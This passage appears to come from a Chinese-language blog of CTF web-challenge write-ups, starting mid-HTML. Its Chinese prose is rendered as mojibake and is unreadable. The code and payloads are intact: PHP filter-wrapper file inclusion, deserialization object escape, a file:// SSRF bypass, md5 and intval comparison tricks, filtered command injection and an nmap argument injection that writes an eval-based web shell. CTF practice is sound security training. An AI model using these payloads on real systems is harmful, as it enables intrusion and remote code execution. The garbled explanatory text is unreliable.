class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°éœ€è¦åŒ…æ‹¬<code>woofers</code>ã€<code>meowers</code>ã€<code>index</code>æ‰ä¼šè¿è¡Œæ–‡ä»¶åŒ…å«</p><p>æŸ¥äº†æŸ¥ä¹‹åçŸ¥é“äº†phpçš„<code>php://filter</code>ä¼ªåè®®å¯ä»¥åµŒå¥—ä¸€å±‚åè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/index/resource=flag</span></span><br></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°flag</p><blockquote><p>flag{ff24c3cf-9d00-4527-acab-ee177724d0a1}</p></blockquote><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><h3 id="phpinfoä¿¡æ¯è·å–"><a href="#phpinfoä¿¡æ¯è·å–" class="headerlink" title="phpinfoä¿¡æ¯è·å–"></a>phpinfoä¿¡æ¯è·å–</h3><p>çœ‹åˆ°é¢˜ç›®ä¸­æœ‰ä¸ª<code>eval(&#39;phpinfo();&#39;);</code></p><p>æ‰“å¼€ååœ¨phpinfoé‡Œå‘ç°äº†ä¸€ä¸ª<code>d0g3_f1ag.php</code></p><h3 id="å˜é‡è¦†ç›–æ¼æ´"><a href="#å˜é‡è¦†ç›–æ¼æ´" class="headerlink" title="å˜é‡è¦†ç›–æ¼æ´"></a>å˜é‡è¦†ç›–æ¼æ´</h3><p>é¢˜ç›®æ‰€ç»™çš„æºä»£ç ä¸­æœ‰extractå‡½æ•°ï¼Œå¯å½¢æˆå˜é‡è¦†ç›–æ¼æ´ï¼Œ<a href="https://blog.csdn.net/weixin_34486302/article/details/115153306?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161857274516780357224643%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161857274516780357224643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-115153306.first_rank_v2_pc_rank_v29&utm_term=extract%E5%AF%BC%E8%87%B4%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96&spm=1018.2226.3001.4187">å…·ä½“çœ‹è¿™</a></p><p>äºæ˜¯å¯ä»¥é‡æ–°ä¼ å…¥SESSIONå‚æ•°è¿›è¡Œè¦†ç›–</p><h3 id="ååºåˆ—åŒ–å¯¹è±¡é€ƒé€¸"><a href="#ååºåˆ—åŒ–å¯¹è±¡é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å¯¹è±¡é€ƒé€¸"></a>ååºåˆ—åŒ–å¯¹è±¡é€ƒé€¸</h3><p>ç”±é¢˜ç›®å¯çŸ¥ï¼Œæƒ³è¦å¾—åˆ°flagï¼Œå¿…é¡»å¾—æ„é€ ä¸€ä¸ªimg=d0g3_f1ag.phpï¼Œä½†æ˜¯å¦‚æœç›´æ¥ä¼ å…¥d0g3_f1ag.phpåˆ™ä¼šè¢«æ­£åˆ™æ›¿æ¢æ‰</p><p>äºæ˜¯å¯ä»¥ä½¿ç”¨ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸æ€§è´¨</p><p>æ­£å¸¸åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;ababab&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>] = base64_encode(<span class="string">&#x27;d0g3_f1ag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°</p><blockquote><p>a:3:{s:4:â€userâ€;s:5:â€guestâ€;s:8:â€functionâ€;s:6:â€abababâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}</p></blockquote><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥è¿™æ ·POST</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå¾—åˆ°è¿™ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>è§£é‡Šä¸€ä¸‹.jpg</code></p><p>æŒ‰ç…§ä¸Šé¢POSTçš„åºåˆ—åŒ–ï¼Œå¯ä»¥å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>è€Œflagè¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯ä¼šå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>ç”±äºuserçš„å‚æ•°ä¸º24ï¼Œè€ŒåŸæ¥çš„6ä¸ªflagå˜ä¸ºâ€â€äº†ï¼Œæ‰€ä»¥ä¼šå¾€åç»§ç»­è¯»å–å‚æ•°</p><p>æ‰€ä»¥[]çš„å‚æ•°å°±è¢«è¯»å–ä¸ºuserçš„å‚æ•°äº†ï¼Œè€ŒåŸæ¥çš„functionåˆ™è¢«æ›¿æ¢æ‰äº†ï¼Œå†åŠ ä¸Šæœ€åçš„}é—­åˆï¼Œåé¢çš„imgä¹Ÿè¢«æ›¿æ¢æ‰äº†ï¼Œå°±é€ æˆäº†ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;[&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a]&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>æœ€ååˆ™é€šè¿‡æç¤ºflagåœ¨<code>/d0g3_fllllllag</code>ä¸­ï¼Œé‡æ–°æ”¾ä¸ªbase64è¿›å»å¾—åˆ°flag</p><blockquote><p>flag{f7eb2141-7201-43fe-b97d-cc5defacd03d}</p></blockquote><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><h3 id="urlsplitå‡½æ•°å¤„ç†é—®é¢˜"><a href="#urlsplitå‡½æ•°å¤„ç†é—®é¢˜" class="headerlink" title="urlsplitå‡½æ•°å¤„ç†é—®é¢˜"></a>urlsplitå‡½æ•°å¤„ç†é—®é¢˜</h3><p>é¢˜ç›®é¦–å…ˆè°ƒç”¨äº†urlsplitå‡½æ•°ï¼Œè®²urlåˆ†å‰²ååˆ¤æ–­æ˜¯å¦ä¸º<code>suctf.cc</code></p><p>ç„¶ååé¢æœ‰è°ƒç”¨äº†unurlsplitå‡½æ•°å°†urlåˆèµ·æ¥ï¼Œå†æ¬¡åˆ¤æ–­æ˜¯å¦ä¸º<code>suctf.cc</code></p><p>æµ‹è¯•å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;file:////suctf.cc/abababab&quot;</span></span><br><span class="line">parts = parse.urlsplit(url)</span><br><span class="line">print(parts)</span><br><span class="line"></span><br><span class="line">url2 = urlunsplit(parts)</span><br><span class="line">parts2 = parse.urlsplit(url2)</span><br><span class="line">print(parts2)</span><br></pre></td></tr></table></figure><p>åˆ™å¯ä»¥å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SplitResult(scheme=<span class="string">&#x27;file&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;//suctf.cc/abababab&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">SplitResult(scheme=<span class="string">&#x27;file&#x27;</span>, netloc=<span class="string">&#x27;suctf.cc&#x27;</span>, path=<span class="string">&#x27;/abababab&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™å°±å¯ä»¥æˆåŠŸç»•è¿‡å‰é¢åˆ†å‰²åçš„åˆ¤æ–­è¯­å¥</p><h3 id="nginxçš„é…ç½®"><a href="#nginxçš„é…ç½®" class="headerlink" title="nginxçš„é…ç½®"></a>nginxçš„é…ç½®</h3><blockquote><p>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx<br>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf<br>ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service<br>æ¨¡å—ï¼š/usr/lisb64/nginx/modules<br>åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx<br>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html<br>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx<br>é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</p></blockquote><p>è¿™å°±å¯ä»¥æ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªflagè·¯å¾„<code>/usr/fffffflag</code></p><p>è·å–flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure><blockquote><p>flag{23da88ac-576f-4e40-819a-06e1c7da43fb}</p></blockquote><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>è¿›å…¥robots.txtå‘ç°ä¸€ä¸ª/fAke_f1agggg.phpï¼Œè¿›å»ååœ¨httpåè®®å¤´ä¸Šå‘ç°äº†ä¸€ä¸ªfl4g.php</p><p>è¿›å…¥åæ˜¯ä¸€ä¸²ä»£ç å®¡è®¡</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>é¦–å…ˆç¬¬ä¸€ä¸²æ˜¯intvalå‡½æ•°ç»•è¿‡ï¼Œä¼˜åŒ–ä¸€ä¸‹ä»£ç ï¼Œæˆ‘ä»¬æ˜¯è¦ä½¿ä¹‹echo 1æ‰èƒ½ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><blockquote><p>?num=1e5</p></blockquote><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>ç„¶åæ˜¯md5ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¾—éå†å‡ºæ¥ä¸€ä¸ªmd5å‰æ˜¯0eå¼€å¤´å¹¶ä¸”md5åè¿˜æ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²</p><p>æ„é€ payload</p><blockquote><p>?num=1e5&amp;md5=0e215962017</p></blockquote><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>æœ€åå°±æ˜¯å‘½ä»¤æ³¨å…¥çš„ç®€å•è¿‡æ»¤äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line"><span class="comment">//        system($get_flag);</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ç©ºæ ¼è¿˜è¿‡æ»¤äº†catï¼Œä½†æ˜¯ä¹Ÿç®€å•</p><p>æ„é€ payload</p><blockquote><p>?num=0x23333&amp;md5=0e215962017&amp;get_flag=base64%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag </p></blockquote><p>æœ€åå¾—åˆ°flag</p><blockquote><p>flag{9093578f-7506-4128-b9d0-e2c08aab5bcd}</p></blockquote><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><h3 id="Nmapçš„å‘½ä»¤ä½¿ç”¨"><a href="#Nmapçš„å‘½ä»¤ä½¿ç”¨" class="headerlink" title="Nmapçš„å‘½ä»¤ä½¿ç”¨"></a>Nmapçš„å‘½ä»¤ä½¿ç”¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡º</span><br><span class="line">-oN Â  Â  Â  æ ‡å‡†è¾“å‡º</span><br><span class="line">-oX Â  Â Â  Â XMlè¾“å‡º</span><br><span class="line">-oS  Â  Â  Â script jlddi3</span><br><span class="line">-oG  Â  Â  Â grepable</span><br><span class="line">-oA  Â  Â  Â åŒæ—¶è¾“å‡ºä¸‰ç§ä¸»è¦æ ¼å¼</span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><blockquote><p>127.0.0.1 â€˜ -oN b.phtml &lt;?=eval($_POST[a]);?&gt;â€™</p></blockquote><p>å¯ä»¥ä¼ ä¸€ä¸ªé©¬ä¸Šå»ï¼Œç„¶åpostå‘½ä»¤æ³¨å…¥</p><p>æœ€åå¾—åˆ°flag</p><blockquote><p>flag{5ba50035-1b24-49c0-86a1-57d28288c511}</p></blockquote><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>æ˜ç¤ºé˜´é—´é¢˜ï¼Ÿ</p><p><img src="https://i.loli.net/2021/04/24/r7DcNFXlEPRIyas.png"></p><p>æŸ¥çœ‹æºä»£ç å‘ç°ä¸€ä¸ª/time.php?source</p><h3 id="ååºåˆ—åŒ–-phpå‡½æ•°æ‹¼æ¥"><a href="#ååºåˆ—åŒ–-phpå‡½æ•°æ‹¼æ¥" class="headerlink" title="ååºåˆ—åŒ–+phpå‡½æ•°æ‹¼æ¥"></a>ååºåˆ—åŒ–+phpå‡½æ•°æ‹¼æ¥</h3><p>é¢˜ç›®ç»™å‡ºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>; <span class="comment">//å‚æ•°</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>; <span class="comment">//dataå‡½æ•°å</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>); <span class="comment">//æ‹¼æ¥æ„é€  =&gt; data(Y-m-d h:i:s)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); <span class="comment">//ååºåˆ—åŒ–</span></span><br></pre></td></tr></table></figure><p>æŸ¥äº†å¥½ä¹…æ€ä¹ˆç»•__constructï¼Œç»“æœæœ€åå‘ç°å…¶å®æ ¹æœ¬ä¸éœ€è¦ç»•_(Â¦3ã€âˆ )_</p><p>æ„é€ payloadè¯•è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡å•¥ç”¨ï¼Œåº”è¯¥æ˜¯systemè¢«banäº†ï¼Œè¯•è¯•assert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿›åˆ°äº†phpinfo()ï¼Œç„¶åç›´æ¥æŸ¥æ‰¾flagå°±å¯ä»¥äº†</p><p>æœ€åå¾—åˆ°flag</p><blockquote><p> flag{63ff34b3-4698-48c7-8d82-19be438a88f3}</p></blockquote><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>è¯•äº†è¯•å•¥ä¸œè¥¿éƒ½æ²¡æ‰¾åˆ°ï¼Œæœ€åè¯•è¯•æ‰«ç›®å½•ï¼Œæœ€åæ‹¿åˆ°ä¸ª<code>index.php.swp</code></p><p>ä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çŸ¥é“éœ€è¦å¾—åˆ°ä¸€ä¸ªpasswordæ˜¯md5ç¼–ç 